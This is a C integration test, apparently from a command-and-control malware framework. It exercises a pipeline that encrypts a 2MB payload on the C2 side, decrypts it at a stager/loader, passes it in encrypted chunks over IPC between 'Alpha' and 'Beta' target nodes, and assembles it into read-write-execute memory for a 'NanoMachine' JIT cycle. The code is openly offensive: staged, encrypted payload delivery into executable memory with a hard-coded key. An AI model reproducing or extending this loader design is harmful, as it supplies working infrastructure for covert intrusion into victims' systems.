#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>

#include "../common/types.h"
#include "../common/config.h"
#include "../c2_comms/crypto.h"
#include "../c2_comms/c2_client.h"
#include "../nexus_auditor/ipc_protocol.h"

#define PAYLOAD_SIZE (2 * 1024 * 1024)

#define TEST_ASSERT(cond, msg) \
    do { \
        if (!(cond)) { \
            fprintf(stderr, "[FAIL] %s:%d: %s\n", __FILE__, __LINE__, msg); \
            exit(EXIT_FAILURE); \
        } \
    } while (0)

void test_e2e_2mb_pipeline() {
    printf("[*] Starting E2E 2MB Crypto Integration Test...\n");

    // Initialize distinct crypto contexts representing the C2 agent and the Alpha/Beta target architecture
    aegis_crypto_ctx_t c2_ctx;
    aegis_crypto_ctx_t alpha_node_ctx;
    aegis_crypto_ctx_t beta_node_ctx; // NanoMachine runs on Beta node context

    // Using a simple common PSK
    const char *test_psk = "Rz9kX3BhcnRuZXJzX2luX2NyaW1lX0xPX2FuZF9FTkk=";

    TEST_ASSERT(aegis_crypto_init(&c2_ctx, test_psk) == AEGIS_OK, "C2 crypto init failed");
    TEST_ASSERT(aegis_crypto_init(&alpha_node_ctx, test_psk) == AEGIS_OK, "Alpha crypto init failed");
    TEST_ASSERT(aegis_crypto_init(&beta_node_ctx, test_psk) == AEGIS_OK, "Beta crypto init failed");

    // 1. C2 side: Generate and encrypt 2MB payload for Stager/Loader
    printf("    -> Generating and encrypting 2MB payload (C2 Side)...\n");
    uint8_t *original_payload = malloc(PAYLOAD_SIZE);
    uint8_t *c2_encrypted_blob = malloc(PAYLOAD_SIZE);
    TEST_ASSERT(original_payload != NULL && c2_encrypted_blob != NULL, "Payload alloc failed");

    for (size_t i = 0; i < PAYLOAD_SIZE; i++) {
        original_payload[i] = (uint8_t)(i % 256);
    }

    // AAD for standard protocol context
    uint8_t aad[] = "e2e-2mb-protocol";

    // C2 explicitly encrypts the entire 2MB payload blob before sending
    uint8_t c2_iv[AEGIS_GCM_IV_BYTES];
    uint8_t c2_tag[AEGIS_GCM_TAG_BYTES];
    aegis_result_t res = aegis_encrypt(&c2_ctx, original_payload, PAYLOAD_SIZE, aad, sizeof(aad), c2_encrypted_blob, c2_iv, c2_tag);
    TEST_ASSERT(res == AEGIS_OK, "C2 2MB blob encryption failed");

    // 2. Stager/Loader Side: Initial Unpacking (Stage-0 Decryption)
    printf("    -> Stager/Loader: Receiving 2MB blob and decrypting...\n");

    // The Alpha node is the initial entry point, we use its context here to receive the C2 payload.
    // In reality the Stager fetches it, but for our E2E we simulate Alpha node handling the decryption.
    uint8_t *alpha_decrypted_payload = malloc(PAYLOAD_SIZE);
    TEST_ASSERT(alpha_decrypted_payload != NULL, "Alpha payload buffer alloc failed");

    res = aegis_decrypt(&alpha_node_ctx, c2_encrypted_blob, PAYLOAD_SIZE, aad, sizeof(aad), c2_iv, c2_tag, alpha_decrypted_payload);
    TEST_ASSERT(res == AEGIS_OK, "Stager/Alpha Stage-0 2MB decryption failed");

    // Verify sync between C2 and Stager
    TEST_ASSERT(c2_ctx.msg_counter == alpha_node_ctx.msg_counter, "C2 and Alpha context desynchronized after Stage-0");

    // 3. Alpha Node: Fragments via IPC CMD_DISTRIBUTE_CHUNK
    size_t chunk_data_size = AEGIS_IPC_MAX_MSG_SIZE - sizeof(ipc_distribute_chunk_t);
    size_t num_chunks = (PAYLOAD_SIZE + chunk_data_size - 1) / chunk_data_size;

    printf("    -> Alpha Node: Chunking 2MB into %zu chunks of %zu bytes...\n", num_chunks, chunk_data_size);

    // Simulated IPC Socket buffer between Alpha and Beta
    uint8_t *ipc_socket_buffer = malloc(AEGIS_IPC_MAX_MSG_SIZE);
    TEST_ASSERT(ipc_socket_buffer != NULL, "IPC socket buffer alloc failed");

    // Beta Node: Receiving chunks and assembling directly into the NanoMachine vault/mmap region
    printf("    -> Beta Node: Simulating NanoMachine vault mmap allocation (PROT_READ|PROT_WRITE|PROT_EXEC)...\n");
    void *exec_map = mmap(NULL, PAYLOAD_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    TEST_ASSERT(exec_map != MAP_FAILED, "Loader mmap failed");

    // We must reset the alpha_node_ctx counter for IPC chunking or it will be perpetually out of sync with beta_node_ctx
    // which starts at 0. IPC state is independent of C2 connection state.
    alpha_node_ctx.msg_counter = 0;

    for (size_t i = 0; i < num_chunks; i++) {
        size_t current_chunk_size = chunk_data_size;
        size_t offset = i * chunk_data_size;

        if (offset + current_chunk_size > PAYLOAD_SIZE) {
            current_chunk_size = PAYLOAD_SIZE - offset;
        }

        // --- Alpha Node Simulation (Encrypting IPC Chunk) ---
        uint8_t *plaintext_chunk = alpha_decrypted_payload + offset;
        ipc_distribute_chunk_t header;
        header.chunk_id = i;
        header.total_chunks = num_chunks;
        header.chunk_len = current_chunk_size;

        uint8_t *ciphertext_chunk = ipc_socket_buffer + sizeof(ipc_distribute_chunk_t);

        // Alpha encrypts the chunk to send to Beta via independent IPC crypto state
        res = aegis_encrypt(&alpha_node_ctx, plaintext_chunk, current_chunk_size, aad, sizeof(aad), ciphertext_chunk, header.chunk_iv, header.chunk_tag);
        TEST_ASSERT(res == AEGIS_OK, "Alpha IPC chunk encryption failed");

        // Prepend header to socket buffer
        memcpy(ipc_socket_buffer, &header, sizeof(ipc_distribute_chunk_t));

        // --- IPC Socket Transmission Simulation ---

        // --- Beta Node Simulation (Decrypting and Assembling directly into mmap vault) ---
        ipc_distribute_chunk_t *received_header = (ipc_distribute_chunk_t *)ipc_socket_buffer;
        uint8_t *received_ciphertext = ipc_socket_buffer + sizeof(ipc_distribute_chunk_t);

        uint8_t *decrypted_chunk = (uint8_t *)exec_map + (received_header->chunk_id * chunk_data_size);

        // Beta Node decrypts the IPC chunk stream using the perfectly synchronized Beta context
        res = aegis_decrypt(&beta_node_ctx, received_ciphertext, received_header->chunk_len, aad, sizeof(aad), received_header->chunk_iv, received_header->chunk_tag, decrypted_chunk);

        if (res != AEGIS_OK) {
            fprintf(stderr, "Chunk %zu decryption failed\n", i);
            TEST_ASSERT(res == AEGIS_OK, "Beta chunk decryption failed");
        }
    }

    printf("    -> All IPC chunks distributed via Alpha, received via Beta, and decrypted successfully.\n");
    printf("    -> Verifying synchronization between Alpha and Beta nodes...\n");
    TEST_ASSERT(alpha_node_ctx.msg_counter == beta_node_ctx.msg_counter, "Alpha and Beta IPC crypto contexts out of sync!");

    // 4. Verify final mapped payload matches original
    printf("    -> Verifying E2E Beta Node mapped vault payload integrity...\n");
    TEST_ASSERT(memcmp(original_payload, exec_map, PAYLOAD_SIZE) == 0, "Beta Node vault payload does not match original!");

    // 5. NanoMachine Simulation: JIT execution via aegis_decrypt_no_advance
    printf("    -> Beta Node: Simulating NanoMachine JIT execution cycle...\n");

    // Simulate encrypting the final assembled mmap buffer as a fake "vault" to prove JIT works
    uint8_t jit_iv[AEGIS_GCM_IV_BYTES];
    uint8_t jit_tag[AEGIS_GCM_TAG_BYTES];
    uint8_t *jit_ciphertext = malloc(PAYLOAD_SIZE);
    TEST_ASSERT(jit_ciphertext != NULL, "NanoMachine vault JIT buffer alloc failed");

    // Beta node creates an internal vault, encrypts the mmap
    res = aegis_encrypt(&beta_node_ctx, exec_map, PAYLOAD_SIZE, aad, sizeof(aad), jit_ciphertext, jit_iv, jit_tag);
    TEST_ASSERT(res == AEGIS_OK, "NanoMachine vault encryption failed");

    // The Beta node msg_counter naturally advanced during creation. Record it for the JIT assertion.
    uint64_t msg_counter_expected = beta_node_ctx.msg_counter;

    // NanoMachine now reads from its vault securely during execution cycle
    uint8_t *jit_execution_buffer = malloc(PAYLOAD_SIZE);

    // NanoMachine specifically uses `aegis_decrypt_no_advance` so internal reads don't desynchronize Alpha<->Beta IPC.
    res = aegis_decrypt_no_advance(&beta_node_ctx, jit_ciphertext, PAYLOAD_SIZE, aad, sizeof(aad), jit_iv, jit_tag, jit_execution_buffer);
    TEST_ASSERT(res == AEGIS_OK, "NanoMachine JIT decryption failed");

    // Assert JIT execution cycle didn't advance state!
    TEST_ASSERT(beta_node_ctx.msg_counter == msg_counter_expected, "NanoMachine JIT cycle corrupted rolling key sequence!");

    free(jit_ciphertext);
    free(jit_execution_buffer);

    munmap(exec_map, PAYLOAD_SIZE);
    free(original_payload);
    free(c2_encrypted_blob);
    free(alpha_decrypted_payload);
    free(ipc_socket_buffer);

    aegis_crypto_destroy(&c2_ctx);
    aegis_crypto_destroy(&alpha_node_ctx);
    aegis_crypto_destroy(&beta_node_ctx);

    printf("[+] E2E 2MB Crypto Integration Test passed.\n");
}

int main() {
    printf("========================================================\n");
    printf("  AEGIS E2E INTEGRATION TEST (2MB PAYLOAD)             \n");
    printf("========================================================\n\n");

    test_e2e_2mb_pipeline();

    printf("\n========================================================\n");
    printf("  ALL INTEGRATION TESTS PASSED SUCCESSFULLY             \n");
    printf("========================================================\n");

    return 0;
}
